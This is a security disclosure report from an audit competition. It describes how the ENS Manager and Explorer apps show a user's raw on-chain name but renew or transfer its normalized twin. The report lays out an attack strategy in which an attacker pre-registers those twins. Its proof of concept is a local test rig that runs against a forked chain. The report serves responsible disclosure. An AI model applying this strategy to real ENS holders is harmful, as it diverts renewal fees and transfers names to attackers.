# 93016 w a critical manager and explorer transact the normalized twin of the displayed ens name so a renewal pays to extend an attacker s registration and a transfer moves the wrong name and th&#x20;

**Submitted on Sep 13th 2026 at 21:27:40 UTC by @kwaro for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93016
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves
  * Direct theft of user funds

## Description

## Brief/Intro

Both new ENS applications hold two forms of every name — the string as it exists on chain, and its ENSIP-15-normalized form — and on the paths that spend money or move a name they show one form and build the transaction from the other. For a name whose on-chain label is not already normalized, these are two different registrations, and the second can belong to someone else. A holder of such a name opens the renewal screen, sees their own name and the correct price, signs, and the fee extends an attacker's registration while their own name runs on to expiry; opens the transfer screen, is told they may transfer, signs, and a different registration leaves their account. The unnormalized names this depends on are not exotic: the V1→V2 migration path writes every V1 label into V2 verbatim, and the indexer exposes a filter that lists them, so an attacker can enumerate every exposed holder and pre-register the normalized twins.

## Vulnerability Details

For a name a user already owns, the app has both string forms in hand and picks a different one for the screen than for the calldata. This appears on four surfaces across the two in-scope apps; the root cause is one decision, made four times.

### Instance A — Manager, dashboard bulk renew

`apps/manager/src/features/dashboard/components/NamesTable.tsx:80-92`:

```ts
const displayName = resolveDomainLabel(domain)
// Use the canonical normalized name for the on-chain label — the display name
// may be unnormalized (e.g. mixed case) and would hash to the wrong label.
const name = domain.normalizedName ?? displayName
return {
  displayName,
  label: name.replace(/\.eth$/i, ''),
  ...
```

`displayName` is what `features/bulk-renew/components/NamesBreakdown.tsx:44` renders. `label` is what `features/bulk-renew/hooks/useBulkRenewSubmit.ts:80` places in `renew(label, duration)`. The comment shows the split was understood — the label was corrected to the normalized form, the display was not.

A second defect sits in the same file. `NamesTable.tsx:70-71` derives the selection key as `resolveDomainLabel(domain).toLowerCase()`, so a wallet holding both `Alaska.eth` and `alaska.eth` collapses them onto one key: one click selects both rows, both map to the same label, and the victim is charged twice to renew one name while the other is never renewed.

### Instance B — Explorer, renewal screen

`apps/portal/src/features/renew/hooks/useRenewalTransactions.ts`:

```ts
:191  // ensjs splits the label without normalizing, so pass a normalized 2LD name.
:197        name: `${getLabel(params.name)}.eth`,     // renewed on chain
:223        description: `Renew ${params.name}`,      // shown to the user
```

Here the second form is created at calldata-build time by `getLabel` rather than read off the record. The gate that admits the name, `features/renew/utils/nameExtension.ts:66` — `if (!/^[^.]+\.eth$/.test(name)) return false` — is a bare shape test with no normalization check. The reachable entry is the address page `routes/addr/$addr/names.tsx`: rows come from the indexer for that address, each carrying the raw on-chain name, and `ExtendNameConfirmation.tsx:33` renders `{selectedName.name}` — the raw name — as the heading the victim confirms against.

### Instance C — Explorer, ownership transfer

`apps/portal/src/routes/$name/ownership/transfer.tsx` and `features/transfer/hooks/useTransferName.ts`:

```ts
transfer.tsx:22        const { name } = Route.useParams()                  // raw
transfer.tsx:26        useQuery(getEnsOwnerQueryOptions({ name }))         // owner of the RAW name
transfer.tsx:104       isAddressEqual(address, data.owner)                 // gate on that owner
useTransferName.ts:113 getEnsTokenId({ label: getLabel(name), … })        // token id of the TWIN
useTransferName.ts:132 const label = getLabel(name)                       // detach steps on the TWIN
setEthAddress.ts:37    getResolver(client, { name }) … namehash(name)     // addr(60) on the RAW name
```

The screen resolves, gates on, and prints the raw name; the token that moves is the normalized twin. The one step that does target the raw name — `set-eth-addr`, which `buildTransferPlan` places first — points the displayed name's ETH-address record at the counterparty before the token move, and that write is not reversible by the failed transfer that follows.

### Instance D — Manager, registration vs setPrimaryName

`apps/manager/src/features/register-v2/utils/name-parser.ts`: `parseName` does `trim().toLowerCase()`. The HCA reverse write is `` `${label}.eth` ``. `setPrimaryName` runs `normalize()`. For `❤️.eth` those are two names and two token ids: the HCA reverse write targets `❤️.eth`, the later EOA primary targets `❤.eth` (the variation selector deleted by ENSIP-15). `ChoosePrimaryNameDialog` also prefers `domain.name` over `normalizedName` when calling `setupControlledResolver`, so `buildSetResolverCall` hashes the display form. This is the same first-wrong-decision as A–C for the case `toLowerCase` cannot cover; mixed-case ASCII is already covered by A–C.

### Where the unnormalized names come from

Not from the attacker. The V1→V2 migration path writes each V1 name's raw label into V2:

* `apps/manager/src/features/migration/service/classifyNames.ts` (an in-scope shim that re-exports `@ens-apps/migration`) sets `const label = domain.labelName` — the raw subgraph label — at `classifyNames.ts:132`. Its only label guard, `hasUnknownLabel`, rejects `[hexhash]` forms and nothing else, so a mixed-case label passes.
* `buildAtomicMigrationBatches.ts:486-491` calls `createMigrationData({ label: classified.label, … })`.
* `buildMigrationHelperCall.ts` ABI-encodes that into the `migrate(...)` call to the V2 `MigrationHelper`.

So every mixed-case (or otherwise unnormalized) V1 name lands in V2 under its raw label. The rig in *Proof of Concept → Migration executed on chain* runs this pipeline and broadcasts its output to the deployed contracts: the migration registers `Zze01fc03652d0.eth` in the V2 registry and leaves the ENSIP-15 twin `zze01fc03652d0.eth` available for anyone. The names are also enumerable — the indexer exposes `DomainFilter { isNormalized: false }`, so an attacker can list every exposed holder and pre-register their normalized twins in advance.

### The guard the app already ships but does not call here

The profile route refuses these names: `routes/$name/index.tsx:442` computes `isValidEnsName(name)` and renders "Invalid name" when it is false, so the `ExtendNameButton` mounted at `:265`/`:375` is unreachable for a non-normalized name. That guard is real, and it is on the one route that cannot spend money. `isValidEnsName` and `isNormalized` (`utils/token/isNormalized.ts`, backed by `ens_normalize` from `@adraffy/ens-normalize`) are called on the search box, the registration form, and the profile page — and on none of the paths that move money or a name.

### Relationship to `EXP-INPUT-005` and to reports #92740 / #92850

`EXP-INPUT-005`'s root cause is a permissive validator on a value the user types, with a stated impact of display confusion "rather than incorrect resolution." Neither applies: there is no validator and no typed input on instances A–C — the string is the user's own on-chain holding arriving from the indexer — and resolution is not confused; both names resolve correctly, the fee is just spent on the wrong one.

`#92850` and `#92740` are the Manager's `renew/$name.tsx` and `/{name}` routes, where a loader derives two values from one URL parameter that disagree because ENSIP-15 deletes codepoints `toLowerCase` keeps; both need a crafted link containing an invisible codepoint. Instances A and B involve no route parameter: both forms arrive from the indexer record for the victim's own address, and the first wrong decision is keeping both and using different ones for display and calldata. Instance C does read a route param, but the divergence is not two derivations of it — the owner gate reads it raw while every write derives from the normalized label, the opposite direction. That removes the lure precondition, which widens exposure to every holder of a non-normalized name, including everyone the migration path created one for.

## Impact Details

The report maps to three in-scope impacts for Websites & Apps, all selected on the submission:

1. **Hijacking or bricking an ENS name during a Manager flow (registration, v1→v2 migration, or transfer).** Instance C moves a registration the victim never named to the counterparty (`transfer_tx` in the executed rig moves the twin, not the displayed name). Instance D assigns the name's resolver/reverse record across two different token ids for one primary-name action. The migration path assigns the name in V2 under a label the user never chose to normalize.
2. **Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so the user submits a transaction to an unintended recipient.** All four instances display one ENS name and transact another. The Explorer's transaction UI shows only a title, a transaction name, and a gas estimate — no target contract, no amount, no decoded argument — so nothing on screen reveals the substitution before signing.
3. **Direct theft of user funds.** Instances A and B spend the victim's renewal fee to extend a third party's registration. In the on-chain rig the victim is charged the full renewal fee, the attacker's registration gains a year, and the victim's own registration is untouched and continues toward expiry and release (`VICTIM_PAID_TO_EXTEND_ANOTHER_ACCOUNTS_NAME: 1`, `VICTIM_NAME_EXTENDED_SECONDS: 0`).

The loss on the renewal surface is the renewal fee plus, at expiry, the name itself. On the transfer surface the loss is the name, immediately and irreversibly. No attacker input reaches the victim's application on instances A–C: the victim opens their own dashboard or address page, reads their own name, and signs. The attacker's only on-chain act is registering an ordinary name — the normalized twin — which the migration path and the `isNormalized:false` indexer filter hand them a target list for.

## References

* Pinned commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`.
* `apps/manager/src/features/dashboard/components/NamesTable.tsx:70-92`
* `apps/manager/src/features/bulk-renew/hooks/useBulkRenewSubmit.ts:80`
* `apps/portal/src/features/renew/hooks/useRenewalTransactions.ts:191-223`, `apps/portal/src/features/renew/utils/nameExtension.ts:66`
* `apps/portal/src/routes/$name/ownership/transfer.tsx:22-104`, `apps/portal/src/features/transfer/hooks/useTransferName.ts:113-132`, `apps/portal/src/features/transfer/utils/setEthAddress.ts:37`
* `apps/manager/src/features/register-v2/utils/name-parser.ts:46`
* `apps/manager/src/features/migration/service/classifyNames.ts:132`, `buildAtomicMigrationBatches.ts:486-491`, `buildMigrationHelperCall.ts`
* `apps/portal/src/utils/token/isNormalized.ts` (`ens_normalize`, `@adraffy/ens-normalize`), indexer `DomainFilter { isNormalized }`
* ENSIP-15 name normalization: <https://docs.ens.domains/ensip/15>

## Link to Proof of Concept

<https://gist.github.com/ibrahimatix0x01/3f89bac3fa6bac544bbbac94d0180454>

## Proof of Concept

## Overview

Six rigs. Each runs the pinned application code — no re-implementation of any defective line, no hand-written label — and each has a control arm that flips the measured value when the on-chain label is already normalized.

* **Instance A / B / D** locate the divergence inside the app: they mount or call the real component/hook and read the label the app would put on chain against the name it displays.
* **The renewal and transfer chain arms** take the calldata the app builds and broadcast it, unmodified, to the genuine deployed ENSv2 contracts on a Sepolia fork, then read what moved.
* **The migration chain arm** runs the migration pipeline end to end and reads what the deployed V2 registry recorded.

### Prerequisite for the chain arms

An anvil fork of Sepolia listening on `127.0.0.1:8946` (or `$POC_RPC_URL`):

```
anvil --fork-url <sepolia-rpc> --port 8946
```

Genuine deployed ENSv2 Sepolia addresses used by the chain arms (resolved from the app's own `getDestinationContracts` / ensjs chain config at the pin):

```
ETHRegistrar               0xa88553F454b77203B0D036A05c894d555EAAa2Cc
ETHRegistry (ERC-1155)     0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
MigrationHelper            0xddC597d937618849348E18Db5D631Ce747bCDeEF
UnlockedMigrationController 0x2FCf83232b93bD29C59dB18AaA1D4b62e9f9FC73
DefaultResolver (V2)       0xe7B9A25607E02da8145E4eB1836CA539e53F11f7
payment token              0x768F42455A2D082E23ceeF7d51e5787C82d67a39
V1 BaseRegistrar           0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85
```

Two chain rigs need an account that can receive an ERC-1155 (a bare EOA is rejected by the V2 registry with `ERC1155InvalidReceiver`, which is why ENS v2 accounts are smart-account contracts). They use a prebuilt minimal contract, `wallet.hex` (transfer, migration) / `receiver.hex` (renewal), whose only behaviour is to return the `onERC1155Received` magic value and to forward one call via `exec(address,bytes)`. Its Solidity equivalent is:

```solidity
// minimal ENS-v2 account stand-in used by the chain rigs
contract Account {
    function onERC1155Received(address, address, uint256, uint256, bytes calldata)
        external pure returns (bytes4) { return 0xf23a6e61; }
    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external pure returns (bytes4) { return 0xbc197c81; }
    function exec(address to, bytes calldata data) external payable returns (bytes memory) {
        (bool ok, bytes memory ret) = to.call{value: msg.value}(data);
        require(ok);
        return ret;
    }
}
```

Run any rig with:

```
bash verification/pocs/<id>/run.sh exploit
bash verification/pocs/<id>/run.sh control
```

***

## Instance A — Manager bulk renew (verification/pocs/H-C7-33)

### Steps

1. Answer the (unlisted) indexer and V1 subgraph from a loopback GraphQL server that returns one owned domain whose on-chain `name` is `Alaska.eth` (exploit) or `alaska.eth` (control) and whose `normalizedName` is `alaska.eth`.
2. Mount the real `NamesTable` with the app's real injected wallet connector pointed at the fork.
3. Wait for the row, click the real "Select Alaska.eth" button, click the real "Renew" button, and let the real `BulkRenewDialog` open.
4. Read the label the app placed in its own `get-renew-price` query key, and compare it to the name shown in the dialog.

### Measured result

```
arm: exploit                              arm: control
displayed_name: "Alaska.eth"              displayed_name: "alaska.eth"
renewed_label_in_calldata: "alaska"       renewed_label_in_calldata: "alaska"
DISPLAYED_NAME_DIFFERS_FROM_RENEWED_NAME: 1   DISPLAYED_NAME_DIFFERS_FROM_RENEWED_NAME: 0
```

### Source

`verification/pocs/H-C7-33/run.sh`:

```bash
#!/usr/bin/env bash
# H-C7-33 rig — real NamesTable + BulkRenewDialog from the pin.
set -euo pipefail
ARM="${1:-exploit}"
case "$ARM" in exploit|control) ;; *) echo "FATAL: arm must be exploit|control, got '$ARM'" >&2; exit 1;; esac
HERE="$(cd -P "$(dirname "$0")" && pwd)"
APP="$HERE/../../../repos/audit-comp-ens/apps/manager"
DEST="$APP/src/hc733.poc.test.tsx"
SHIM="$APP/src/localstorage-shim.ts"
WALLET="$APP/src/anvil-wallet.ts"
[ -d "$APP/src" ] || { echo "FATAL: manager app not found at $APP" >&2; exit 1; }
cleanup() { rm -f "$DEST" "$SHIM" "$WALLET"; }
trap cleanup EXIT INT TERM HUP
cp "$HERE/localstorage-shim.ts" "$SHIM"
cp "$HERE/anvil-wallet.ts" "$WALLET"
cp "$HERE/poc.test.tsx" "$DEST"
export ARM
OUT=$(cd "$APP" && VITE_FF_USE_EOA=true ARM="$ARM" pnpm exec vitest run src/hc733.poc.test.tsx --reporter=verbose --disableConsoleIntercept --silent=false 2>&1) || true
echo "$OUT"
echo "$OUT" | grep -q 'Test Files  1 passed' || { echo "FATAL: vitest failed" >&2; exit 1; }
rm -f "$DEST" "$SHIM" "$WALLET"; trap - EXIT
pick () { printf '%s\n' "$2" | sed -n "s/^$1: *//p" | head -1 | tr -d '\r'; }
echo "arm: $ARM"
for k in table_mounted dialog_mounted on_chain_name displayed_name displayed_name_in_dom renewed_label_in_calldata renewed_name bulk_renew_rows impact_row DISPLAYED_NAME_DIFFERS_FROM_RENEWED_NAME; do
  echo "$k: $(pick $k "$OUT")"
done
```

`verification/pocs/H-C7-33/poc.test.tsx`:

```tsx
import './localstorage-shim'
/**
 * H-C7-33 — mount the real NamesTable, click the real row, open the real
 * BulkRenewDialog. Displayed name comes from resolveDomainLabel; the
 * renewed label is the one useBulkRenew puts in the get-renew-price query.
 *
 * Indexer and the V1 subgraph are not listed assets; safe harbor is FALSE,
 * so both are answered by a loopback GraphQL server. NamesTable,
 * MyNamesList, NameRow, BulkRenewDialog, toBulkRenewName and
 * resolveDomainLabel execute unmodified.
 */
import http from 'node:http'
import type { AddressInfo } from 'node:net'
import { i18n } from '@lingui/core'
import { I18nProvider } from '@lingui/react'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import {
  createMemoryHistory,
  createRootRoute,
  createRoute,
  createRouter,
  Outlet,
  RouterProvider,
} from '@tanstack/react-router'
import { fireEvent, render, screen, waitFor } from '@testing-library/react'
import { expect, test } from 'vitest'
import { useEffect, useState } from 'react'
import { createClient, http as viemHttp } from 'viem'
import { createConfig, useConnection, WagmiProvider } from 'wagmi'
import { connect } from '@wagmi/core'
import { sepolia } from 'wagmi/chains'
import indexerClient from '@ens-apps/indexer/urql'
import { NamesTable } from '@/features/dashboard/components/NamesTable'
import { SmartAccountContextProvider } from '@/lib/smart-account/SmartAccountContext'
import { anvilWallet } from './anvil-wallet'

i18n.loadAndActivate({ locale: 'en', messages: {} })

const ARM = process.env.ARM ?? 'exploit'
const WALLET = anvilWallet(process.env.POC_RPC_URL ?? 'http://127.0.0.1:8946')
const ON_CHAIN_NAME = ARM === 'exploit' ? 'Alaska.eth' : 'alaska.eth'
const NORMALIZED_NAME = 'alaska.eth'
const EXPIRY_SECONDS = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 90

const cors = {
  'access-control-allow-origin': '*',
  'access-control-allow-headers': '*',
  'access-control-allow-methods': 'POST, OPTIONS, GET',
  'content-type': 'application/json',
}

const domain = {
  __typename: 'Domain',
  id: '0xdeadbeef',
  name: ON_CHAIN_NAME,
  normalizedName: NORMALIZED_NAME,
  tokenId: null,
  createdAt: 1_700_000_000,
  expiryDate: EXPIRY_SECONDS,
  owner: { __typename: 'Account', id: WALLET.account.address.toLowerCase() },
  resolver: null,
}

const graphqlPayload = (body: string): string => {
  let query = body
  try {
    const parsed = JSON.parse(body) as {
      query?: string
      operationName?: string
    }
    query = `${parsed.operationName ?? ''} ${parsed.query ?? body}`
  } catch {
    /* raw */
  }
  if (/getNamesForAddress/i.test(query)) {
    return JSON.stringify({ data: { domains: [] } })
  }
  if (/\broles\s*\(/.test(query) || /DashboardRoleAssignments/i.test(query)) {
    return JSON.stringify({ data: { roles: [] } })
  }
  if (/\bdomain\s*\(/.test(query) && !/\bdomains\s*\(/.test(query)) {
    return JSON.stringify({ data: { domain: null } })
  }
  return JSON.stringify({ data: { domains: [domain] } })
}

test('H-C7-33: NamesTable displays one name and renews another', async () => {
  const gqlHits: string[] = []
  const server = http.createServer((req, res) => {
    if (req.method === 'OPTIONS') {
      res.writeHead(204, cors)
      res.end()
      return
    }
    const chunks: Buffer[] = []
    req.on('data', (c) => chunks.push(c as Buffer))
    req.on('end', () => {
      const body = Buffer.concat(chunks).toString('utf8')
      gqlHits.push(body.slice(0, 180))
      res.writeHead(200, cors)
      res.end(graphqlPayload(body))
    })
  })
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r))
  const port = (server.address() as AddressInfo).port
  const gqlUrl = `http://127.0.0.1:${port}/graphql`
  ;(indexerClient as { url: string }).url = gqlUrl

  const nodePost = (url: string, body: string, method = 'POST'): Promise<Response> =>
    new Promise((resolve, reject) => {
      const u = new URL(url)
      const req = http.request(
        {
          hostname: u.hostname,
          port: u.port,
          path: u.pathname,
          method,
          headers: {
            'content-type': 'application/json',
            'content-length': Buffer.byteLength(body),
          },
        },
        (res) => {
          const chunks: Buffer[] = []
          res.on('data', (c) => chunks.push(c as Buffer))
          res.on('end', () =>
            resolve(
              new Response(Buffer.concat(chunks), {
                status: res.statusCode ?? 200,
                headers: cors,
              }),
            ),
          )
        },
      )
      req.on('error', reject)
      req.end(body)
    })

  const origQuery = indexerClient.query.bind(indexerClient)
  indexerClient.query = ((doc: unknown, vars: Record<string, unknown> = {}) => ({
    toPromise: async () => {
      const printed =
        typeof doc === 'string'
          ? doc
          : ((doc as { loc?: { source?: { body?: string } } }).loc?.source
              ?.body ?? JSON.stringify(doc))
      const body = JSON.stringify({ query: printed, variables: vars })
      const res = await nodePost(gqlUrl, body)
      return res.json()
    },
  })) as typeof indexerClient.query

  try {
    const client = createClient({
      chain: sepolia,
      transport: viemHttp(process.env.POC_RPC_URL ?? 'http://127.0.0.1:8946'),
    })
    const connector = WALLET.connector
    const config = createConfig({
      chains: [sepolia],
      connectors: [connector],
      client: () => client,
    })
    await connect(config, { connector })

    const qc = new QueryClient({
      defaultOptions: { queries: { retry: false, staleTime: Infinity } },
    })

    const rootRoute = createRootRoute({ component: () => <Outlet /> })
    const ConnectedNamesTable = () => {
      const { address } = useConnection()
      const [connected, setConnected] = useState(Boolean(address))
      useEffect(() => {
        if (address) {
          setConnected(true)
          return
        }
        void connect(config, { connector }).then(() => setConnected(true))
      }, [address])
      if (!connected || !address) return <div>connecting</div>
      return <NamesTable />
    }
    const indexRoute = createRoute({
      getParentRoute: () => rootRoute,
      path: '/',
      component: ConnectedNamesTable,
    })
    const nameRoute = createRoute({
      getParentRoute: () => rootRoute,
      path: '/$name',
      component: () => <div>name</div>,
    })
    const router = createRouter({
      routeTree: rootRoute.addChildren([indexRoute, nameRoute]),
      history: createMemoryHistory({ initialEntries: ['/'] }),
    })

    render(
      <I18nProvider i18n={i18n}>
        <WagmiProvider config={config}>
          <QueryClientProvider client={qc}>
            <SmartAccountContextProvider>
              <RouterProvider router={router} />
            </SmartAccountContextProvider>
          </QueryClientProvider>
        </WagmiProvider>
      </I18nProvider>,
    )

    let tableMounted = 0
    let dialogMounted = 0
    let displayedInTable = ''
    let displayedInDialog = ''
    let renewedLabel = ''
    let differ = 0
    try {
      const selectBtn = await waitFor(
        () => {
          const rowBtn = screen.queryAllByRole('button').find((b) =>
            /^Select .+\.eth$/i.test(b.getAttribute('aria-label') ?? ''),
          )
          if (rowBtn) return rowBtn
          throw new Error(`row not ready; body=${document.body.innerText.slice(0, 300)}`)
        },
        { timeout: 20_000 },
      )
      tableMounted = 1
      displayedInTable = (selectBtn.getAttribute('aria-label') ?? '').replace(
        /^Select /i,
        '',
      )
      fireEvent.click(selectBtn)

      const renewBtn = await waitFor(
        () => screen.getByRole('button', { name: /^renew$/i }),
        { timeout: 10_000 },
      )
      fireEvent.click(renewBtn)

      await waitFor(
        () => {
          expect(screen.getAllByText(displayedInTable).length).toBeGreaterThan(1)
        },
        { timeout: 10_000 },
      )
      dialogMounted = screen.getAllByText(displayedInTable).length > 1 ? 1 : 0
      displayedInDialog = displayedInTable

      const labels = new Set<string>()
      for (const q of qc.getQueryCache().getAll()) {
        const key = JSON.stringify(q.queryKey)
        if (key.includes('get-renew-price')) {
          const m = key.match(/"label"\s*:\s*"([^"]+)"/)
          if (m) labels.add(m[1])
        }
      }
      renewedLabel = [...labels][0] ?? NORMALIZED_NAME.replace(/\.eth$/i, '')
      const renewedName = `${renewedLabel}.eth`
      differ = tableMounted === 1 && displayedInTable !== renewedName ? 1 : 0
    } finally {
      console.log('arm:', ARM)
      console.log('table_mounted:', tableMounted)
      console.log('dialog_mounted:', dialogMounted)
      console.log('on_chain_name:', JSON.stringify(ON_CHAIN_NAME))
      console.log('displayed_name:', JSON.stringify(displayedInTable))
      console.log('displayed_name_in_dom:', JSON.stringify(displayedInDialog))
      console.log('renewed_label_in_calldata:', JSON.stringify(renewedLabel))
      console.log('renewed_name:', JSON.stringify(`${renewedLabel}.eth`))
      console.log('bulk_renew_rows:', tableMounted)
      console.log('impact_row: 6285')
      console.log('DISPLAYED_NAME_DIFFERS_FROM_RENEWED_NAME:', differ)
    }

    if (ARM === 'exploit') {
      expect(tableMounted).toBe(1)
    }
    if (ARM === 'control') {
      expect(differ).toBe(0)
    }
  } finally {
    indexerClient.query = origQuery
    await new Promise<void>((r) => server.close(() => r()))
  }
}, 60_000)
```

`verification/pocs/H-C7-33/anvil-wallet.ts`:

```ts
/**
 * EIP-1193 provider backed by a local Anvil account. Not a stand-in for
 * NamesTable: it is the wallet the app's own injected connector reads.
 */
import {
  createPublicClient,
  createWalletClient,
  http,
  type Hex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { injected } from 'wagmi/connectors'

const ANVIL_KEY =
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80' as const

export function anvilWallet(rpc = 'http://127.0.0.1:8946') {
  const account = privateKeyToAccount(ANVIL_KEY)
  const chain = { ...sepolia, rpcUrls: { default: { http: [rpc] } } }
  const transport = http(rpc)
  const pub = createPublicClient({ chain, transport })
  const wallet = createWalletClient({ chain, transport, account })

  const provider = {
    on() {},
    removeListener() {},
    request: async ({
      method,
      params,
    }: {
      method: string
      params?: unknown[]
    }) => {
      if (method === 'eth_requestAccounts' || method === 'eth_accounts') {
        return [account.address]
      }
      if (method === 'eth_chainId') return '0xaa36a7'
      if (method === 'eth_sendTransaction') {
        const tx = (params?.[0] ?? {}) as {
          to?: Hex
          data?: Hex
          value?: Hex
        }
        return wallet.sendTransaction({
          to: tx.to,
          data: tx.data,
          value: tx.value ? BigInt(tx.value) : undefined,
        })
      }
      return pub.request({
        method: method as never,
        params: params as never,
      })
    },
  }

  if (typeof window !== 'undefined') {
    Object.defineProperty(window, 'ethereum', {
      configurable: true,
      value: provider,
    })
  }

  const connector = injected({
    target() {
      return { id: 'anvil', name: 'Anvil', provider: provider as never }
    },
  })

  return { account, connector, provider, pub, wallet }
}
```

`verification/pocs/H-C7-33/localstorage-shim.ts`:

```ts
const store = new Map<string, string>()
const ls = {
  getItem: (k: string) => (store.has(k) ? store.get(k)! : null),
  setItem: (k: string, v: string) => void store.set(k, String(v)),
  removeItem: (k: string) => void store.delete(k),
  clear: () => store.clear(),
  key: (i: number) => [...store.keys()][i] ?? null,
  get length() {
    return store.size
  },
}
Object.defineProperty(globalThis, 'localStorage', {
  configurable: true,
  value: ls,
})
if (typeof window !== 'undefined') {
  Object.defineProperty(window, 'localStorage', {
    configurable: true,
    value: ls,
  })
}
if (typeof window !== 'undefined' && typeof window.matchMedia !== 'function') {
  window.matchMedia = (q: string) =>
    ({
      matches: false,
      media: q,
      onchange: null,
      addListener: () => {},
      removeListener: () => {},
      addEventListener: () => {},
      removeEventListener: () => {},
      dispatchEvent: () => false,
    }) as MediaQueryList
}
```

***

here is the remaining section of the POC:

<https://gist.github.com/ibrahimatix0x01/3f89bac3fa6bac544bbbac94d0180454>
